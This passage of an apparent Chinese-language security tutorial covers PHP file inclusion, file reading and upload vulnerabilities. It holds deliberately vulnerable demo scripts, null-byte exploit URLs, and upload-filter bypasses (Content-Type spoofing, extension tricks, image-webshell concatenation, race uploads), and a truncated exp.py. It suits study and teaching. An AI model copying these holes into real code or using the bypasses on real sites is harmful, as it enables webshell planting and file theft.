<p>00截断(受限于GPC和addslashes等函数影响,php5.3之后也不能使用这个方法,不过现在很少有这个漏洞了):</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>假如你发现了截断包含漏洞,然后又只能上传某些固定后缀的文件,那可以试下00截断</p>
<p><code>http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00</code></p>
<p>多个<code>.</code>和<code>/</code>截断,不受GPC限制,但是在php5.3之后修复</p>
<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><p>程序在下载文件或者读取显示文件的时候,读取文件的参数直接在请求中传递,后台程序获取到这个文件后直接读取返回,问题在于这个参数是用户可控的,可以直接传入想要的文件路径。</p>
<p>文件读取或者下载函数:</p>
<ul>
<li>file_get_contents</li>
<li>high_light</li>
<li>fopen</li>
<li>readfile</li>
<li>fread</li>
<li>…</li>
</ul>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/fileread.php?file=aaa.txt</code></p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果能把文件上传到管理员或者应用程序不想让你上传的目录,那么就存在文件上传漏洞。</p>
<p>一般的检测流程:</p>
<ul>
<li>客户端javascript校验（一般只校验文件的扩展名）</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image&#x2F;gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>目录路经检测（检测跟Path参数相关的内容）</li>
<li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<p>利用函数:</p>
<ul>
<li>move_uploaded_file</li>
</ul>
<h3 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h3><p>jsupload.php (test on php 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//文件上传漏洞演示脚本之js验证</span><br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$uploaddir</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件上传成功，保存于：&#x27;</span> . <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">//print_r($_FILES);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;<br>    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upfile&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>            <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;你还没有选择任何文件，不能上传!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-comment">//定义允许上传的文件类型</span><br>            <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;</span>;<br>            <span class="hljs-comment">//提取上传文件的类型</span><br>            <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>            <span class="hljs-comment">//alert(ext_name);</span><br>            <span class="hljs-comment">//alert(ext_name + &quot;|&quot;);</span><br>            <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>            <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>                <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &lt;/script&gt;<br>&lt;body&gt;<br>&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/jsupload.php</code></p>
<p>判断方式：<br>在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg&#x2F;.jpeg&#x2F;.png后缀名的文件，而此时并没有发送数据包。</p>
<p>绕过方法：<br>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp<br>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firebug之类的插件把它禁掉）</p>
<h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><h4 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h4><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-string">&quot;image/jpg&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploading failed.\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>绕过方法:<br>配置Burp Suite代理进行抓包，将Content-Type修改为image&#x2F;gif，或者其他允许的类型</p>
<h4 id="扩展名检测"><a href="#扩展名检测" class="headerlink" title="扩展名检测"></a>扩展名检测</h4><p>黑名单检测:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExt</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//sunstr - 返回字符串的子串</span><br>    <span class="hljs-comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$black_file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;php|jsp|asp&quot;</span>);<span class="hljs-comment">//允许上传的文件类型组</span><br>    <span class="hljs-variable">$new_upload_file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">getExt</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>])); <span class="hljs-comment">//取得被.隔开的最后字符串</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$new_upload_file_ext</span>,<span class="hljs-variable">$black_file</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不合法&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$new_upload_file_ext</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$filename</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Upload Success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>apache服务器可能做了配置不会解析特殊扩展名<br>使用其他服务器复现(我使用的nginx),上传php4扩展名绕过黑名单<br><code>http://127.0.0.1/uploads/shell.php4</code></p>
<p>白名单检测:<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</p>
<p>绕过方法：</p>
<ul>
<li>文件名大小写绕过<ul>
<li>用像 AsP，pHp 之类的文件名绕过黑名单检测</li>
</ul>
</li>
<li>名单列表绕过<ul>
<li>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类</li>
</ul>
</li>
<li>特殊文件名绕过<ul>
<li>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意 Unix&#x2F;Linux 系统没有这个特性</li>
</ul>
</li>
<li>0x00截断<ul>
<li>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中(php版本需要小于5.3.4,magic_quotes_gpc&#x3D;Off)</li>
</ul>
</li>
</ul>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>文件头检测:</p>
<ul>
<li>JPG: FF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF: 47 49 46 38 39 61 (GIF89a)</li>
<li>PNG: 89 50 4E 47<br>绕过方法:<br>添加头对应的文件头伪造</li>
</ul>
<p>文件相关信息检测:</p>
<ul>
<li>检查图片大小、尺寸等的信息。<br>绕过方法:<br>将代码注入到正常文件中(比如图片马:copy &#x2F;b 1.jpg+2.php)</li>
</ul>
<h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>当文件上传到服务器,先暂时保存,在检查是不是符合条件,如果不符合再删掉。<br>利用思路就是我们用多线程不断上传.php文件,在某个没有被删除的时刻如果访问到了.php文件,就生成一个shell,shell就会存到服务器。</p>
<p>eg:</p>
<p>competionupload.php(test on php 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;<br>    <span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br>    <span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success.file path is: &quot;</span>.<span class="hljs-variable">$newfile</span>.<span class="hljs-string">&quot;\n&lt;br /&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 